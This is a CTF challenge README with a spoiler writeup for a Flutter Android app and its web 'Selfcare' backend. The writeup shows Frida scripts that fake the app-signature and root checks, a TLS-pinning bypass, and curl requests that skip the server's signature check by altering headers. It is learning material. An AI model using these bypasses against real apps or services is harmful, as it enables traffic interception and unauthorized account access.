# Here OTT

<p align="center">
    <img src="assets/mobileapp_main.png" alt="Mobile app main screen" height=400 />
    <br />
    <i>Main screen</i>
</p>

A <ins>rather complex, but medium difficulty mobile && web challenge</ins> where a single APK is given to the CTF solver which seems to present some kind of login page.

## How to run

The image was tested with podman, but should work fine with docker as well.

0. Clone the repo and cd to the root folder of the particular challenge
1. Export the current working directory as a variable: `export CTF_ROOT=$PWD`
2. Build the native-api: `cd $CTF_ROOT/native-api && ./build.sh build` _(**NOTE**: the build argument is important, otherwise the image won't be prepared)_
    - Prepend `/* eslint-disable */` to the top of the `native-api/out/pkg/native_api.js` file: `sed -i '1s;^;/* eslint-disable */\n;' $CTF_ROOT/native-api/out/pkg/native_api.js`
3. Copy native-api to frontend: `rm -rf $CTF_ROOT/selfcare-frontend/src/wasm/*; cp $CTF_ROOT/native-api/out/pkg/native_api* $CTF_ROOT/selfcare-frontend/src/wasm/`
4. Build the frontend: `cd $CTF_ROOT/selfcare-frontend && ./build.sh build` _(**NOTE**: the build argument is important, otherwise the image won't be prepared)_
5. Copy the frontend to the backend: `rm -rf $CTF_ROOT/backend/assets/frontend/*; cp -r $CTF_ROOT/selfcare-frontend/out/dist/* $CTF_ROOT/backend/assets/frontend/`
6. Build the backend: `cd $CTF_ROOT/backend && ./build.sh build` _(**NOTE**: the build argument is important, otherwise the image won't be prepared)_
7. Optionally build the mobile app: `cd $CTF_ROOT/mobile-app && ./build.sh build` _(**NOTE**: the build argument is important, otherwise the image won't be prepared)_
8. Package and build the final container: `podman build -t ctf-here_ott:latest .`
9. Run it (feel free to replace the port): `podman rm -f hereott; podman run -d --name=hereott -p 8083:8083 -e BACKEND_PORT=8083 ctf-here_ott:latest`
10. Share the [mobile-app/out/app-release.apk](mobile-app/out/app-release.apk) with the participants

<details>
<summary>Writeup (Spoiler)</summary>

Upon exploring the [mobile app given to us](mobile-app/out/app-release.apk), we can see that it's a [flutter](https://flutter.dev/) based mobile app that bundles [mlkit](https://developers.google.com/ml-kit) (used for barcode recognition based on the context of the other files), some cert and libtoolChecker, which is part of a well-known root checker for Android, [RootBeer](https://github.com/scottyab/rootbeer):

<p align="center">
    <img src="assets/mobileapp_filetree.png" alt="Part of the mobile app's file tree" width="400" />
    <br />
    <i>Part of the mobile app's file tree</i>
</p>

If we try to log-in, we get invalid or missing credentials. There is also a QR code based log-in, but we don't know what's that for yet. We might also notice from the network activity/DNS logs or just by taking away the internet from the app, that it tries to load some kind of content and until that's loaded, several strings are just _Loading_ or _N/A_. Which suggests that there is some API it is interacting with. Therefore the goal is clear: we should capture the app's network traffic.

While in Java's case this would be a rather easy task, since we can hook the runtime APIs easily with [frida](https://frida.re/docs/android/) or even modify and recompile [dalvik](https://source.android.com/docs/core/runtime) bytecode, flutter is a different beast since it bundles the entire runtime into a native object and the app is compiled ahead of time. Static analysis is quite an insane task. As for patching and logging network calls... That is also relatively hard. There is however an effort to replace the flutter runtime with a patched one, that provides a lot of debugging layers: [reFlutter](https://github.com/ptswarm/reFlutter). This could be used to capture HTTP requests done by the app from dart.

However in this case it would most likely not work since the app checks its own signature and refuses to start if it detects tampering. We can check this very quickly by re-packing and re-signing the APK:

```
[steve@todo testapp]$ apktool d app-release.apk 
I: Using Apktool 2.8.1-dirty on app-release.apk
[...]
I: Copying META-INF/services directory
[steve@todo testapp]$ cd app-release/
[steve@todo app-release]$ ls
AndroidManifest.xml  apktool.yml  assets  kotlin  lib  META-INF  original  res  smali  unknown
[steve@todo app-release]$ apktool b .
I: Using Apktool 2.8.1-dirty
[...]
I: Built apk into: ./dist/app-release.apk
[steve@todo app-release]$ cd dist/
[steve@todo dist]$ keytool -genkeypair -alias myalias -keyalg RSA -keysize 2048 -validity 10000 -keystore mykeystore.jks
Enter keystore password:  
Re-enter new password: 
What is your first and last name?
  [Unknown]:  
What is the name of your organizational unit?
  [Unknown]:  
What is the name of your organization?
  [Unknown]:  
What is the name of your City or Locality?
  [Unknown]:  
What is the name of your State or Province?
  [Unknown]:  
What is the two-letter country code for this unit?
  [Unknown]:  
Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?
  [no]:  yes
[steve@todo dist]$ ~/Android/Sdk/build-tools/34.0.0/zipalign -f -v 4 app-release.apk app-release-zipaligned.apk 
Verifying alignment of app-release-zipaligned.apk (4)...
[...]
Verification succesful
[steve@todo dist]$ ~/Android/Sdk/build-tools/34.0.0/apksigner sign --ks ./mykeystore.jks --ks-key-alias myalias app-release-zipaligned.apk
Keystore password for signer #1:
[steve@todo dist]$ ls
app-release.apk  app-release-zipaligned.apk  app-release-zipaligned.apk.idsig  mykeystore.jks
[steve@todo dist]$ 
```

Now if we install this modified APK:

```
[steve@todo dist]$ adb install app-release-zipaligned.apk 
* daemon not running; starting now at tcp:5037
* daemon started successfully
Performing Incremental Install
Serving...
Performing Streamed Install
Success
```

<p align="center">
    <img src="assets/mobileapp_tamperdetected.png" alt="Mobile app shows tamper detected dialog and refuses to run" height=400 />
    <br />
    <i>The mobile app shows a tamper detected dialog and refuses to run</i>
</p>

Technically its possible to patch the signature validation if one knows that this isn't possible from flutter as app signatures are Android specific. Which means that this has to be done from Java:

<p align="center">
    <img src="assets/jadx_signaturecall.png" alt="The method that returns the build signature in JADX" height=400 />
    <br />
    <i>The method that returns the build signature in JADX</i>
</p>

One could come up with the following frida script, to fake the signature (the classes can be different if the app is rebuilt):

```js
let C4090c = Java.use("v2.c");
C4090c["b"].implementation = function (null) {
    console.log(`C4090c.m916b is called: null=${null}`);
    let result = "F64E4626A7E33C2DAD9669249337B69A8E124B33";
    return result;
};
```

Or they can even patch the signature check from dalvik bytecode and then fool the app into thinking that its official, but both methods are rather complicated and not required.

Luckily, instead of the regular dart HTTP calls, this app uses flutter_okhttp which is basically a layer between flutter and Java to do the requests from Java and okhttp.

We can setup [mitmproxy](https://mitmproxy.org) or some similar alternative and try to see if we can intercept the app's calls.

<p align="center">
    <img src="assets/proxy_settings.png" alt="Proxy settings for mitmproxy in Android" height=400 />
    <br />
    <i>Proxy settings for mitmproxy in Android (assuming the IP is 192.168.247.194 and the proxy is on port 8080)</i>
</p>

And it won't work:

<p align="center">
    <img src="assets/mobileapp_sslerror.png" alt="TLS certificate pinning failed shows inside the app" height=400 />
    <br />
    <i>TLS certificate pinning failed</i>
</p>

So the app checks the remote server's TLS certificate and if it doesn't match the one baked into the app, it will simply fail. This is a common practice in many mission critical applications and this happens, because mitmproxy uses its own cert in order to intercept HTTPS calls. At this point, one can replace the assets/cert.pem file in the APK, repack, resign and patch the signature verification and successfully pass this challenge, or they can root their device/emulator, get frida running on the device and then they can use a project called [frida-android-unpinning](https://github.com/httptoolkit/frida-android-unpinning). This frida script is able to detect and successfuly get rid of many basic TLS checks.

<p align="center">
    <img src="assets/mobileapp_rootdetected.png" alt="Root detected dialog shown by the app" height=400 />
    <br />
    <i>Root detected by the app</i>
</p>

If we use Magisk for root, this is really easy to get around with. All we need to do is open Magisk and put the HereOTT app to the denylist:

<p align="center">
    <img src="assets/magisk_denylist.png" alt="Magisk's denylist with HereOTT whitelisted" width=400 />
    <br />
    <i>Magisk's denylist</i>
</p>

If we don't, we must locate the root check, and patch it ourselves:

<p align="center">
    <img src="assets/jadx_rootcheck.png" alt="Root check method in JADX" width=400 />
    <br />
    <i>Root check method in JADX</i>
</p>

The following frida script could do the job:

```js
let C3984b = Java.use("t2.b");
C3984b["n"].implementation = function () {
    console.log(`C3984b.m1109n is called`);
    let result = false; // false means not rooted
    return result;
};
```

Now we are ready to run frida on the device, start the TLS unpinning script on the app and wait for the network calls to show up.

First I will start frida-server on the device:

```
[steve@todo ~]$ adb shell
davinci:/ $ su
davinci:/ # cd /data/local/tmp
davinci:/data/local/tmp # ./frida-server                                                                                                                                                                                                   
WARNING: generic atexit() called from legacy shared library
```

Then I will run the script:

```
[steve@todo Downloads]$ frida -U -f hu.honeylab.cyberquest.hereott -l ./frida-script.js 
     ____
    / _  |   Frida 16.1.4 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Mi 9T (id=3893b2b0)
Spawned `hu.honeylab.cyberquest.hereott`. Resuming main thread!         
[Mi 9T::hu.honeylab.cyberquest.hereott ]-> ---
Unpinning Android app...
[+] SSLPeerUnverifiedException auto-patcher
[+] HttpsURLConnection (setDefaultHostnameVerifier)
[+] HttpsURLConnection (setSSLSocketFactory)
[+] HttpsURLConnection (setHostnameVerifier)
[+] SSLContext
[+] TrustManagerImpl
[...]
Unpinning setup completed
---
  --> Bypassing Trustmanager (Android < 7) request
  --> Bypassing HttpsURLConnection (setDefaultHostnameVerifier)
  --> Bypassing Trustmanager (Android < 7) request
  --> Bypassing HttpsURLConnection (setDefaultHostnameVerifier)
  --> Bypassing Trustmanager (Android < 7) request
```

And we have successfully bypassed the TLS pinning:

<p align="center">
    <img src="assets/mitmproxy_config.png" alt="mitmproxy shows the app's config call" width=400 />
    <br />
    <i>mitmproxy shows the app's config call</i>
</p>

We see that it does the following request:

```
curl -H 'x-platform: Android' --compressed -H 'user-agent: okhttp/4.10.0' 'https://hereott.honeylab.hu:8083/v1/config?username=HereOttMobileApp&password=OTc5NjdhZjBkYjQ3OGU4NDJlMTZkYmY3YWVhNmU5M2E&version=1.0.0&app=hu.honeylab.cyberquest.hereott&uuid=91b1791b-8a40-48eb-b611-f6519e0c45bf -k'
```

Which gets me back:

```json
{"status":"OK","Token":{"key":"28f8b53e-e7cb-428d-a16b-b354e2cd2958","exp":"1696846051"},"Version":{"id":"42","appName":"HereOtt","version":"1.0.0"},"clientRegion":"Meseorszag","currency":"FABATKA","logCollectionUrl":"https://hereott.honeylab.hu:8083/v1/log","DeviceProfiles":[{"name":"Web_OTT_1080p"},{"name":"Web_OTT_720p"}],"apiBase":"https://hereott.honeylab.hu:8083","apiVersion":"v1","locale":"hu-HU","appsListUrl":"https://hereott.honeylab.hu:8083/files/apps_list_Meseorszag_v1.json","ParentalGuidanceRatings":[{"name":"0","value":"Visibly safe for children"},{"name":"12","value":"Not recommended for children under 12"}],"epgBackwardsDays":7,"epgForwardsDays":7,"epgFetchChunkSize":100,"watermarkedMedia":false,"loginWithCode":true,"pvrEnabled":true}
```

Seemingly nothing interesting here. We also have a login endpoint which gives back wrong username or password no matter what we feed it:

```
curl -H 'content-type: application/json; charset=utf-8' --compressed -H 'user-agent: okhttp/4.10.0' -X POST https://hereott.honeylab.hu:8083/v1/login -d '{"username":"test","password":"test"}' -k
```

Let's evaluate the values learnt from the config endpoint! First we see a URL to some logging call, but `https://hereott.honeylab.hu:8083/v1/log` returns `{}` to all requests.

Then there is `https://hereott.honeylab.hu:8083/files/apps_list_Meseorszag_v1.json`. If we query it, we get:


```json
[{"appid":"mediaplayer","name":{"en-GB":"Media Player","hu-HU":"Medialejatszo"},"logo":{"216x216":"https://localhost:56789/apps/MediaPlayer/images/mediaplayer.png"},"url":"https://localhost:56789/apps/MediaPlayer/index.html","description":"With the Media Player you can play your own content from a USB stick or from a DLNA server.","audio":true,"background":false,"profile":"MediaPlayer","privacyNotice":true,"consentNotice":true},{"appid":"selfcare","name":{"en-GB":"Selfcare","hu-HU":"Selfcare"},"logo":{"216x216":"https://hereott.honeylab.hu:8083/images/selfcare.png"},"url":"https://hereott.honeylab.hu:8083/selfcare/selfcare-frontend/","description":"With the Selfcare app you can manage your account. Pair and unpair your devices directly from your TV!","audio":false,"background":false,"profile":"SelfCare","privacyNotice":true,"consentNotice":true}]
```

There is not much we can do with the localhost URL, but the other one looks interesting. If we visit the link using a browser, we see the following:

<p align="center">
    <img src="assets/selfcare_ui.png" alt="The Selfcare webapp in a browser" width=400 />
    <br />
    <i>The Selfcare webapp in a browser</i>
</p>

This seems to be some kind of TV app according to the description that is able to add and remove devices. We see that clicking on both menus end up in an error toast. It also seems to be sending the following request:

```
curl 'https://hereott.honeylab.hu:8083/selfcare/selfcare-backend/devices' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'SerialNumber: 862-8632531' -H 'uuid: d3a35aed-0a76-44f4-bf68-0ca15daa5d81' -H 'uid: undefined' -H 'sig: undefined' -H 'Authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==' -H 'Connection: keep-alive' -H 'Referer: https://hereott.honeylab.hu:8083/selfcare/selfcare-frontend/device-list' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'DNT: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'TE: trailers'
```

And the response is:

```json
{"error": "Signature mismatch"}
```

Not surprising, since it's indeed `undefined`.

If we check the stacktrace in the browser's developer console, we can very quickly see the caller method:

```js
fdl(e) {
    const n = i.Z.ServerUrl,
    t = {
    SerialNumber: e,
    uuid: this.generateUUID(),
    uid: (0, a.sq) ().toString(),
    sig: (0, a.Xx) (`${ n }/devices`, '').toString()
    },
    r = {
    username: 'hereottselfcare',
    password: 'hereottselfcare'
    };
    o.Z.get(`${ n }/devices`, {
    headers: t,
    auth: r
    }).then((e => {
    this.devices = e.data['devices']
    })).catch(
    (
        e => {
        console.error('Error fetching devices:', e),
        this.toast.error('Error fetching devices')
        }
    )
    )
},
```

Time to see what returns `undefined`. If we add breakpoints to the sig line, we can track down what does it call and after some wrapper calls, we end up at this method:

```js
function p(e, n) {
    let t,
    o;
    try {
    const s = r.__wbindgen_add_to_stack_pointer( - 16),
    d = v(e, r.__wbindgen_malloc, r.__wbindgen_realloc),
    l = f,
    h = v(n, r.__wbindgen_malloc, r.__wbindgen_realloc),
    p = f;
    r.sign(s, d, l, h, p);
    var i = u() [s / 4 + 0],
    a = u() [s / 4 + 1];
    return t = i,
    o = a,
    c(i, a)
    } finally {
    r.__wbindgen_add_to_stack_pointer(16),
    r.__wbindgen_free(t, o, 1)
    }
}
```

This seems to be wasm written in rust due to the bindgen references. Not good for us since rust + wasm is insanely hard to reverse engineer. But we can confirm that there is indeed a .wasm file loaded and used.

One might try to reverse engineer the whole wasm mess, but if we think about it, the reason why we might get `undefined` is because it tries to use some native API that exists only on the ISP provided TV boxes. Since its not available, it will simply return undefined. Which means that the server needs a valid Sig signature to continue. Does it though?

```
[steve@todo Downloads]$ curl 'https://hereott.honeylab.hu:8083/selfcare/selfcare-backend/devices' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'SerialNumber: 862-8632531' -H 'uuid: d3a35aed-0a76-44f4-bf68-0ca15daa5d81' -H 'uid: undefined' -H 'Authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==' -H 'Connection: keep-alive' -H 'Referer: https://hereott.honeylab.hu:8083/selfcare/selfcare-frontend/device-list' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'DNT: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'TE: trailers' -k
{"error": "UID is missing or invalid"}
```

Woah, upon removal, we get a different error. Nice backend. ;) But now we need a valid UID... Let's pass `1` instead of `undefined`:

```
[steve@todo Downloads]$ curl 'https://hereott.honeylab.hu:8083/selfcare/selfcare-backend/devices' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'SerialNumber: 862-8632531' -H 'uuid: d3a35aed-0a76-44f4-bf68-0ca15daa5d81' -H 'uid: 1' -H 'Authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==' -H 'Connection: keep-alive' -H 'Referer: https://hereott.honeylab.hu:8083/selfcare/selfcare-frontend/device-list' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'DNT: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'TE: trailers' -k
{"devices":[{"id":"5eeaac0e-afa9-47cc-a6b9-2f5650bb2615","name":"HereOTT MediaBox Pro","type":"stb","active":true}]}
```

And it works!

> In fact any fibonacci number between 1 and 20 should work.

There is even a device already in the listing. We can try to use some sketchy browser addon to modify the headers for us, we can also use curl, implement our own client, but Chrome has a handy override feature for scripts. I just modified the uid to 1 and got rid of the sig header:

<p align="center">
    <img src="assets/js_override.png" alt="Chrome's devtools with the modified script" width=400 />
    <br />
    <i>Chrome's devtools with the modified script</i>
</p>

If we now reload the page, we can see the following:

<p align="center">
    <img src="assets/device_list.png" alt="Device list of the TV app" width=400 />
    <br />
    <i>Device list of the TV app, now populated</i>
</p>

And if we navigate to the _'Pair a device'_ option, we can see the following:

<p align="center">
    <img src="assets/pairing.png" alt="Pairing menu of the TV app with a QR code" width=400 />
    <br />
    <i>Pairing menu of the TV app with a QR code</i>
</p>

If only we could scan this QR code... Actually, we could... There was a login with QR option in the mobile app. If we try to scan the QR code, we get the following:

<p align="center">
    <img src="assets/solution.png" alt="QR reader with a dialog and the flag" height=400 />
    <br />
    <i>Wohoo, we got the flag!</i>
</p>

Fun fact: Each QR code can be used only once. And the QR code contains an 8 digit random PIN. It's encrypted with AES-CBC 128 bit with PKCS7 padding. The QR code contains the key since it's in `0|<keyinbase64>|<encryptedpinbase64>` format. And the IV is returned by the selfcare backend's `/pair` endpoint too so it's actually not a must to use the app in order to decrypt the PIN, however it makes things easier.

I have also included a PoC script that can be used to go through the whole process: [poc.py](poc.py) Please note that it uses OpenCV2 for the QR code recognition, which isn't nearly as good as mlkit used by the app. If you get an error upon running, just re-run the script. I could have used a better model, but all other alternatives were either too big or too slow. OpenCV2 seemed to be a decent compromise.
</details>